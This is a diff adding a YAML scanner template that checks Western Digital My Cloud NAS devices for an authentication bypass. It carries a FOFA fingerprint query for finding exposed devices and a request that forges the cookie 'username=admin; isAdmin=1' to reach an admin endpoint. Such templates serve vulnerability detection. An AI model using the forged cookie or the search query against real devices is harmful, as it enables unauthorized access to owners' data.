@@ -1,0 +1,19 @@
+id: poc-yaml-western-digital-my-cloud-nas-authentication-bypass
+info:
+  name: Western Digital My Cloud NAS 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: my_cloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+requests:
+- method: GET
+  path: /web/php/chk_vv_sharename.php?vv_sharename=1
+  expression: status_code == 200 && contains(body,`{"success":false}`)
+- method: GET
+  path: /web/php/chk_vv_sharename.php?vv_sharename=1
+  headers:
+    Cookie: username=admin; isAdmin=1
+  expression: status_code == 200 && contains(body,"<config><res>0</res></config>")
+variables: {}
+transport: http
